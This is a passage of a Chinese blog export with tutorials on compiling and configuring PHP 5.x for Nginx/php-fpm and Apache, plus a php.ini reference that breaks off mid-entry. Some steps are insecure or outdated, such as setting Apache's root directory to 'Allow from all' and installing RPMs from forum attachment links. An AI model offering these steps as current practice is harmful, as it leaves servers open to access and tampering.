    <content type="text"><![CDATA[LNMP- php编译安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先针对 nginx 的 php 安装和针对 apache 的 php 安装是有区别的，因为 nginx 中的 php 是以 fastcgi 的方式结合 nginx 的。可以理解为 nginx 代理了 php 的 fastcgi ，而 apache 是把 php 作为子机的模块来调用的。php官方下载地址 1.下载 php 源码包12[root@lnmp ~]# cd /usr/local/src[root@lnmp src]# wget http://aul.php.net/distributions/php-5.4.44.tar.bz2 2.解压源码包1[root@lnmp src]# tar jxf php.5.4.44.tar.bz2 3.创建相关帐号1[root@lnmp src]# useradd -s /sbin/nologin php-fpm 4.依赖包安装1yum install -y bzip2-devel curl-devel db4-devel libjpeg-devel libpng-devel libXpm-devel gmp-devel libc-client-devel openldap-devel unixODBC-devel postgresql-devel sqlite-devel aspell-devel net-snmp-devel libxslt-devel libxml2-devel pcre-devel mysql-devel unixODBC-devel postgresql-devel pspell-devel net-snmp-devel freetype-devel libtomcrypt-devel.x86_64 php-mcrypt libmcrypt libmcrypt-devel 5.配置编译参数1234567891011121314151617181920212223242526[root@lnmp src]# cd php-5.4.44[root@lnmp php-5.4.44]# ./configure \--prefix=/usr/local/php \--with-config-file-path=/usr/local/php/etc \--enable-fpm \--with-fpm-user=php-fpm \--with-fpm-group=php-fpm \--with-mysql=/usr/local/mysql \--with-mysql-sock=/tmp/mysql.sock \--with-libxml-dir \--with-gd \--with-jpeg-dir \--with-png-dir \--with-freetype-dir \--with-iconv-dir \--with-zlib-dir \--with-mcrypt \--enable-soap \--enable-gd-native-ttf \--enable-ftp \--enable-mbstring \--enable-exif \--disable-ipv6 \--with-pear \--with-curl \--with-openssl &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在该过程中，若出现和 lamp 安装 php 的错误一样的错误参照 lamp 的方法来解决，若出现如下错误，参考下面解决办法： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;错误信息： 12configure: error: Please reinstall the libcurl distribution - easy.h should be in &lt;curl-dir&gt;/include/curl/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法： 1yum install -y libcurl-devel 6.编译 php1[root@lnmp php-5.4.44]# make &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这一步，通常会遇到一些错误： 123/usr/bin/ld: cannot find -lltdlcollect2: ld returned 1 exit statusmake: *** [sapi/fpm/php-fpm] 错误 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法： 1yum install -y libtool-ltdl-devel 7.安装 php1[root@lnmp php-5.4.44]# make install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上每一步骤，如果没有完全执行正确，那么下一步是无法进行的，使用 echo $? 看结果是否为 “0”，如果不是，就是没有执行正确。 8.修改配置文件12cp php.ini-production /usr/local/php/etc/php.inivim /usr/local/php/etc/php-fpm.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加如下内容： 1234567891011121314[global]pid = /usr/local/php/var/run/php-fpm.piderror_log = /usr/local/php/var/log/php-fpm.log[www]listen = /tmp/php-fcgi.sockuser = php-fpmgroup = php-fpmpm = dynamicpm.max_children = 50pm.start_servers = 20pm.min_spare_servers = 5pm.max_spare_servers = 35pm.max_requests = 500rlimit_files = 1024 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存配置文件后，检验配置是否正确的方法为： 1/usr/local/php/sbin/php-fpm -t &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果出现诸如 “test is successful” 字样，说明配置没有问题。 9.启动 php-fpm&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先要拷贝一个启动脚本到 /etc/init.d 下 1cp /usr/local/src/php-5.4.44/sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改权限为755 12chmod 755 /etc/init.d/php-fpmservice php-fpm start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果要它开机启动，执行： 1chkconfig php-fpm on &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测是否成功： 1ps aux |grep php-fpm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看看是不是有很多进程]]></content>
      <tags>
        <tag>LNMP</tag>
        <tag>Php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php-fpm配置文件]]></title>
    <url>%2F2017%2F08%2F10%2FPhp%2F14.%20php-fpm%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[php-fpm配置文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之前给出了 php-fpm.conf 的内容，下面给出一个模版，配置如下 12345678910111213141516[global]pid = /usr/local/php/var/run/php-fpm.piderror_log = /usr/local/php/var/log/php-fpm.log[www]listen = /tmp/php-fcgi.sockuser = php-fpmgroup = php-fpmlisten.owner = nobody //和后面的nginx一致listen.group = nobody //同上pm = dynamicpm.max_children = 50pm.start_servers = 20pm.min_spare_servers = 5pm.max_spare_servers = 35pm.max_requests = 500rlimit_files = 1024 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 [global] 部分是全局配置，指定 pid 文件路径以及 error_log 路径。 [www] 是一个 pool ，还可以再写第二个 pool ，第二个 pool 和第一个不易演的的地方，首先 pool 的 name ，比如叫做 [www2] 。然后 listen 肯定就不能一样了，比如 可以 listen = /tmp/php-fcgi2.sock 。而 user ， group 也可以和 [www] 中定义的不一样。 listen.owner 这个是定义 /tmp/php-fcgi2.sock 这个文件的所有者是谁，在 php5.4 版本之后监听的 socket 文件权限默认变成了 600，如果不定义 listen.owner 那么 nginx 调用这个 socket 的时候就没有权限了，所以在这里定义 listen.owner 为 nginx 的子进程监听用户。 pm = dynamic 表示以动态的形式启动，在 php5.3 版本以后它可以支持动态和静态了，如果是静态，即 pm = static 时，下面的配置只有 pm.max.children 管用。 pm.max.children 表示启动几个 php-fpm 的子进程。如果是 dynamic ，下面的配置会生效，pm.max.children 表示最大可以启动几个子进程。 pm.start_servers 表示一开始启动几个子进程。 pm.max_requeste 表示一个子进程最多可以接受多少个请求，比如设置为500那么一个子进程手里500个请求后自动销毁。 rlimit_files 表示每个子进程打开的多少个文件句柄。 12slowlog = /tmp/www_slow.logrequest_slowlog_timeout = 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表示一个脚本执行时间超过 1秒就要记录这个slow.log ，记录这个可以看到这个脚本哪里执行慢，可以通过slow.log排查网站慢的原因，根据这个原因做一定的优化。 1php_admin_value [open_basedir] = /data/www/:/tmp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;apache 可以设置 open_basedir ，php-fpm也可以，不同的 pool 设置不同的 open_basedir 可以针对不同的域名进行不同的限制。多个目录用 ：分割。]]></content>
      <tags>
        <tag>LNMP</tag>
        <tag>Php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS 6 编译安装php 5.4 5.5（lamp模式）]]></title>
    <url>%2F2017%2F08%2F10%2FPhp%2F2.%20CentOS%206%20%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85php%205.4%205.5%EF%BC%88lamp%E6%A8%A1%E5%BC%8F%EF%BC%89%2F</url>
    <content type="text"><![CDATA[CentOS 6 编译安装php 5.4 5.5（lamp模式） 下载php5.4 1wget http://cn2.php.net/distributions/php-5.4.36.tar.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;5.5下载地址 解压 123tar jxvf php-5.4.36.tar.bz2 cd php-5.4.36 安装yum扩展源 1rpm -i 'https://www.apelearn.com/bbs/data/attachment/forum/epel-release-6-8_32.noarch.rpm' 安装依赖包 1yum install libxml2-devel libjpeg-* libpng-devel freetype-devel gd-devel libmcrypt-devel openssl-devel 配置编译参数 1234567891011121314151617181920./configure --prefix=/usr/local/php \ --with-apxs2=/usr/local/apache2/bin/apxs \ --with-config-file-path=/usr/local/php/etc \ --with-mysql=/usr/local/mysql \ --with-libxml-dir \ --with-gd \ --with-jpeg-dir \ --with-png-dir \ --with-freetype-dir \ --with-iconv-dir \ --with-zlib-dir \ --with-bz2 \ --with-openssl \ --with-mcrypt \ --enable-soap \ --enable-gd-native-ttf \ --enable-mbstring \ --enable-sockets \ --enable-exif \ --disable-ipv6 编译安装 1make &amp;&amp; make install]]></content>
      <tags>
        <tag>LAMP</tag>
        <tag>Php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php.ini 中开启短标签]]></title>
    <url>%2F2017%2F08%2F10%2FPhp%2F10.%20php.ini%20%E4%B8%AD%E5%BC%80%E5%90%AF%E7%9F%AD%E6%A0%87%E7%AD%BE%2F</url>
    <content type="text"><![CDATA[php.ini 中开启短标签&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;控制参数： 1short_open_tag = On &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果设置为Off，则不能正常解析类似于这样形式的php文件： 123&lt;?phpinfo()?&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而只能解析 123&lt;?phpphpinfo()?&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样形式的php文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以要想php支持短标签，需要我们把short_open_tag 设置为On.]]></content>
      <tags>
        <tag>LAMP</tag>
        <tag>Php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php的错误日志级别 error_report]]></title>
    <url>%2F2017%2F08%2F10%2FPhp%2F11.%20php%E7%9A%84%E9%94%99%E8%AF%AF%E6%97%A5%E5%BF%97%E7%BA%A7%E5%88%AB%20error_report%2F</url>
    <content type="text"><![CDATA[php的错误日志级别 error_report1234567891011121314; E_ALL 所有错误和警告（除E_STRICT外）; E_ERROR 致命的错误。脚本的执行被暂停。; E_RECOVERABLE_ERROR 大多数的致命错误。; E_WARNING 非致命的运行时错误，只是警告，脚本的执行不会停止。; E_PARSE 编译时解析错误，解析错误应该只由分析器生成。; E_NOTICE 脚本运行时产生的提醒（往往是我们写的脚本里面的一些bug，比如某个变量没有定义），这个错误不会导致任务中断。; E_STRICT 脚本运行时产生的提醒信息，会包含一些php抛出的让我们要如何修改的建议信息。; E_CORE_ERROR 在php启动后发生的致命性错误; E_CORE_WARNING 在php启动后发生的非致命性错误，也就是警告信息; E_COMPILE_ERROR php编译时产生的致命性错误; E_COMPILE_WARNING php编译时产生的警告信息; E_USER_ERROR 用户生成的错误; E_USER_WARNING 用户生成的警告; E_USER_NOTICE 用户生成的提醒]]></content>
      <tags>
        <tag>LAMP</tag>
        <tag>Php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php 扩展模块如何安装]]></title>
    <url>%2F2017%2F08%2F10%2FPhp%2F12.%20php%20%E6%89%A9%E5%B1%95%E6%A8%A1%E5%9D%97%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[php 扩展模块如何安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;php 和 apapche 类似，核心文件为 /usr/local/php/bin/php ,针对 apache 的是 /usr/local/apache2/modules/libphp5.so 模块。这两个文件是核心，在编译 php 的时候会提前让它支持一些功能，比如支持 mysql，这个功能其实是 php 的一个模块，只不过这个模块是直接和 php 或者 libphp5.so 文件编译在一起的。当我们编译完成 php 后，发现还需要让 php 支持另外的模块，这时候可以重新编译 php ，加上配置参数，或者直接编译出一个独立的模块文件。然后让 php去调用它。下面以编译 memcache 为例； 1.下载 memcache 源码包 1[root@lamp src]# wget http://www.apelearn.com/bbs/data/attachment/forum/memcache-2.2.3.tgz 安装 123[root@lamp src]# tar zxvf memcache-2.2.3.tgz [root@lamp src]# cd memcache-2.2.3[root@lamp memcache-2.2.3]# /usr/local/php/bin/phpize &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：这一步是借助 php 的 phpize 工具生成 configure 文件。在这一步可能会遇到一些错误，不如 “Cannot find config.m4”，这是因为系统还没有安装 m4 工具，使用 yum 安装 1[root@lamp ~]# yum install -y m4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有错误“Cannot find autoconf” ，解决办法是 1234[root@lamp ~]# yum install -y autoconf[root@lamp memcache-2.2.3]# ./configure --with-php-config=/usrl/local/php/bin/php-config[root@lamp memcache-2.2.3]# make &amp;&amp; make install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：当 make install 后会生成一个 memcache.so 的模块文件，该文件在 php 的 extension_dir 下。查看 php extension_dir 的方法是 1[root@lamp ~]# /usr/local/php/bin/php -i | grep extension_dir &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改 extension_dir 的方法是，编辑 php.ini 文件 1[root@lamp lamp]# vim /usr/local/php/etc/php.ini &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为（一般情况不做修改） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后继续在 php.ini 中添加 1extension=memcache.so 还有就是重新动态编译 php 自带模块&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先找到 php 的源码包 1[root@lamp ~]# cd /usr/local/src/php-5.6.6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;很多模块的源码都是 /ext 目录下 1[root@lamp php-5.6.6]# cd ext/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在编译一下 curl 模块 1[root@lamp ext]# /usr/local/php/bin/php -m | grep -i curl &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入 curl 目录 1[root@lamp ext]# cd curl/ 1[root@lamp curl]# /usr/local/php/bin/phpize &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面这步是为了生成 configure 文件，没有这个文件是没办法编译的 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编译 1[root@lamp curl]# ./configure --with-php-config=/usr/local/php/bin/php-config &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装 1[root@lamp curl]# make &amp;&amp; make install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编译安装完成，最后一排会有模块目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加载模块 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑 php.ini 1[root@lamp curl]# vim /usr/local/php/etc/php.ini &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加内容 1extension=curl.so &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看是否加载成功]]></content>
      <tags>
        <tag>LAMP</tag>
        <tag>Php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LAMP安装php]]></title>
    <url>%2F2017%2F08%2F10%2FPhp%2F1.%20LAMP%E5%AE%89%E8%A3%85php%2F</url>
    <content type="text"><![CDATA[LAMP安装php&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为什么把 php 放到最后来安装，是有原因的，因为在编译 php 的时候，有指定 mysql 以及 apache 的路径，如果不先安装好 mysql 和 apache 就没有办法安装 php 。而 apache 和 mysql 的安装顺序就无所谓了。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;php官方下载地址 下载 php ：12[rot@localhost httpd-2.2.16]# cd /usr/local/src[root@localhost src]# wget http://am1.php.net/distributions/php-5.3.27.tar.gz 解压源码包：1[root@localhost src]# tar zxf php-5.3.27.tar.gz 依赖包安装1yum install -y bzip2-devel curl-devel db4-devel libjpeg-devel libpng-devel libXpm-devel gmp-devel libc-client-devel openldap-devel unixODBC-devel postgresql-devel sqlite-devel aspell-devel net-snmp-devel libxslt-devel libxml2-devel pcre-devel mysql-devel unixODBC-devel postgresql-devel pspell-devel net-snmp-devel 配置编译参数：12345678910111213141516171819202122root@localhost src]# cd php-5.3.27[root@localhost php-5.3.27]# ./configure \--prefix=/usr/local/php \--with-apxs2=/usr/local/apache2/bin/apxs \--with-config-file-path=/usr/local/php/etc \--with-mysql=/usr/local/mysql \--with-libxml-dir \--with-gd \--with-jpeg-dir \--with-png-dir \--with-freetype-dir \--with-iconv-dir \--with-zlib-dir \--with-bz2 \--with-openssl \--with-mcrypt \--enable-soap \--enable-gd-native-ttf \--enable-mbstring \--enable-sockets \--enable-exif \--disable-ipv6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这一步，遇到如下错误: 错误1：1configure: error: xml2-config not found. Please check your libxml2 installation. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法： 1yum install -y libxml2-devel 错误2：1configure: error: Cannot find OpenSSL's &lt;evp.h&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法： 1yum install -y openssl openssl-devel 错误3：12checking for BZip2 in default path... not foundconfigure: error: Please reinstall the BZip2 distribution &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法： 1yum install -y bzip2 bzip2-devel 错误4：1configure: error: png.h not found. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法： 1yum install -y libpng libpng-devel 错误5：1configure: error: freetype.h not found. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法： 1yum install -y freetype freetype-devel 错误6：1configure: error: mcrypt.h not found. Please reinstall libmcrypt. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法： 12yum install -y epel-releaseyum install -y libmcrypt-devel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rpm安装 epel 1rpm -ivh "http://www.aminglinux.com/bbs/data/attachment/forum/month_1211/epel-release-6-7.noarch.rpm" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为centos 默认的 yum 源没有 libmcrypt-devel 这个包，只能借助 epel 的 yum 源。 错误7：1configure: error: jpeglib.h not found. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法： 1yum -y install libjpeg-devel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编译： 1[root@localhost php-5.3.27]# make &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装： 1[root@localhost php-5.3.27]# make install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装完成后，还不能使用，还需要进一步配置一下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;拷贝 php 配置文件： 1[root@localhost php-5.3.27]# cp php.ini-production /usr/local/php/etc/php.ini &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改 apache 配置文件 1[root@localhost ~]# vim /usr/local/apache2/conf/httpd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;找到： 123456&lt;Directory /&gt; Options FollowSymLinks AllowOverride None Order deny,allow Deny from all&lt;/Directory&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;改为： 123456&lt;Directory /&gt; Options FollowSymLinks AllowOverride None Order deny,allow Allow from all&lt;/Directory&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：如果不修改这个地方，访问网站会禁止访问，显示403。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后找到： 1AddType application/x-gzip .gz .tgz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在该行下添加： 1AddType application/x-httpd-php .php &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;找到： 123&lt;IfModule dir_module&gt; DirectoryIndex index.html&lt;/IfModule&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将该行改为： 123&lt;IfModule dir_module&gt; DirectoryIndex index.html index.htm index.php&lt;/IfModule&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：增加针对 php 的索引，如果一个站点默认页为 index.php ，那么就得加上这个index.php 的支持。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再找到： 1#ServerName www.example.com:80 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为： 1ServerName www.example.com:80 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果不去掉 # ，则启动 apache 时，会有警告信息 “httpd: Could not reliably determine the server&#39;s fully qualified domain name, using localhost.localfomain for SververName”，看起来像是错误，其实没有影响。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看配置文件是否有问题： 1[root@localhost ~]# /usr/local/apache2/bin/apachectl -t &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果显示 Syntax OK ，说明配置没有问题。然后启动服务： 1[root@localhost ~]# /usr/local/apache2/bin/apachectl start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检查 apache 是否正常启动的命令是： 1234567891011[root@lamp ~]# ps aux |grep httpdroot 1434 0.0 0.2 32576 10184 ? Ss 14:18 0:00 /usr/local/apache2/bin/httpd -k startdaemon 1435 0.0 0.2 32708 9084 ? S 14:18 0:00 /usr/local/apache2/bin/httpd -k startdaemon 1436 0.0 0.2 32708 10012 ? S 14:18 0:00 /usr/local/apache2/bin/httpd -k startdaemon 1437 0.0 0.2 32708 9084 ? S 14:18 0:00 /usr/local/apache2/bin/httpd -k startdaemon 1438 0.0 0.2 32708 9084 ? S 14:18 0:00 /usr/local/apache2/bin/httpd -k startdaemon 1439 0.0 0.2 32708 9084 ? S 14:18 0:00 /usr/local/apache2/bin/httpd -k startdaemon 1440 0.0 0.2 32708 9084 ? S 14:18 0:00 /usr/local/apache2/bin/httpd -k startroot 1459 0.0 0.0 5980 736 pts/0 R+ 15:56 0:00 grep --color httpd[root@lamp ~]# netstat -lnp |grep httpdtcp 0 0 :::80 :::* LISTEN 1434/httpd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看看有没有进程列表。如果有显示这行，则启动了。 也可以使用curl命令简单测试: 12[root@localhost ~]# curl localhost&lt;html&gt;&lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只有这样显示才正确。]]></content>
      <tags>
        <tag>LAMP</tag>
        <tag>Php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php.ini 配置详解]]></title>
    <url>%2F2017%2F08%2F10%2FPhp%2F9.%20php.ini%20%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[php.ini 配置详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个文件必须命名为’’php.ini’’并放置在httpd.conf中的PHPIniDir指令指定的目录中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最新版本的php.ini可以在下面两个位置查看： http://cvs.php.net/viewvc.cgi/php-src/php.ini-recommended?view=co http://cvs.php.net/viewvc.cgi/php-src/php.ini-dist?view=co 语法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该文件的语法非常简单。空白字符和以分号开始的行被简单地忽略。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;章节标题(例如: [php])也被简单地忽略，即使将来它们可能有某种意义。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置指令的格式如下： 1directive = value &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指令名(directive)是大小写敏感的！所以”foo=bar”不同于”FOO=bar”。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;值(value)可以是： 用引号界定的字符串(如：”foo”) 一个数字(整数或浮点数，如：0, 1, 34, -1, 33.55) 一个PHP常量(如：E_ALL, M_PI) 一个INI常量(On, Off, none) 一个表达式(如：E_ALL &amp; ~E_NOTICE) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;INI文件中的表达式仅使用：位运算符、逻辑非、圆括号： | 位或 &amp; 位与 ~ 位非 ! 逻辑非 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;布尔标志用 On 表示打开，用 Off 表示关闭。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个空字符串可以用在等号后不写任何东西表示，或者用 none 关键字： foo = ; 将foo设为空字符串 foo = none ; 将foo设为空字符串 foo = “none” ; 将foo设为字符串’’none’’ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果在指令值中使用动态扩展(PHP扩展或Zend扩展)中的常量，那么只能在加载这些动态扩展的指令行之后使用这些常量。 1httpd.conf ;; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还可以在httpd.conf中覆盖php.ini的值，以进行更灵活的配置： php_value name value ;设置非bool型的指令，将value设为none则清除先前的设定 php_flag name on|off ;仅用于设置bool型的指令 PHP常量(如E_ALL)仅能在php.ini中使用，在httpd.conf中必须使用相应的掩码值。 带”SYS”标志的指令只能在httpd.conf中的全局配置部分使用， 带”ini”标志的指令不能在httpd.conf中使用，它们仅能用于php.ini中。 配置指令详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下每个指令的设定值都与 PHP-5.2.0 内建的默认值相同。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也就是说，如果’’php.ini’’不存在，或者你删掉了某些行，默认值与之相同。 Apache[Apache]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;仅在将PHP作为Apache模块时才有效。 engine = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否启用PHP解析引擎。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以在httpd.conf中基于目录或者虚拟主机来打开或者关闭PHP解析引擎。 last_modified = Off 是否在Last-Modified应答头中放置该PHP脚本的最后修改时间。 xbithack = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否不管文件结尾是什么，都作为PHP可执行位组来解析。 child_terminate = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP脚本在请求结束后是否允许使用apache_child_terminate()函数终止子进程。该指令仅在UNIX平台上将PHP安装为Apache1.3的模块时可用。其他情况下皆不存在。 PHP核心[PHP-Core-DateTime]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前四个配置选项目前仅用于date_sunrise()和date_sunset()函数。 date.default_latitude = 31.7667&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认纬度 date.default_longitude = 35.2333&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认经度 date.sunrise_zenith = 90.583333&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认日出天顶 date.sunset_zenith = 90.583333&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认日落天顶 date.timezone =&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;未设定TZ环境变量时用于所有日期和时间函数的默认时区。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;中国大陆应当使用”PRC”，应用时区的优先顺序为： 用date_default_timezone_set()函数设定的时区(如果设定了的话) TZ 环境变量(如果非空的话) 该指令的值(如果设定了的话) PHP自己推测(如果操作系统支持) 如果以上都不成功，则使用 UTC [PHP-Core-Assert]assert.active = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否启用assert()断言评估 assert.bail = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否在发生失败断言时中止脚本的执行 assert.callback =&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;发生失败断言时执行的回调函数 assert.quiet_eval = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否使用安静评估(不显示任何错误信息，相当于error_reporting=0)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若关闭则在评估断言表达式的时候使用当前的error_reporting指令值。 assert.warning = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否对每个失败断言都发出警告 [PHP-Core-SafeMode]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安全模式是为了解决共享服务器的安全问题而设立的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但试图在PHP层解决这个问题在结构上是不合理的， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正确的做法应当是修改web服务器层和操作系统层。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因此在PHP6中废除了安全模式，并打算使用open_basedir指令取代之。 safe_mode = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否启用安全模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开时，PHP将检查当前脚本的拥有者是否和被操作的文件的拥有者相同， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;相同则允许操作，不同则拒绝操作。 safe_mode_gid = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在安全模式下，默认在访问文件时会做UID比较检查。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但有些情况下严格的UID检查反而是不适合的，宽松的GID检查已经足够。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想将其放宽到仅做GID比较，可以打开这个参数。 safe_mode_allowed_envvars = “PHP“&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在安全模式下，用户仅可以更改的环境变量的前缀列表(逗号分隔)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;允许用户设置某些环境变量，可能会导致潜在的安全漏洞。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意: 如果这一参数值为空，PHP将允许用户更改任意环境变量！ safe_mode_protected_env_vars = “LD_LIBRARY_PATH”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在安全模式下，用户不能更改的环境变量列表(逗号分隔)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些变量即使在safe_mode_allowed_env_vars指令设置为允许的情况下也会得到保护。 safe_mode_exec_dir = 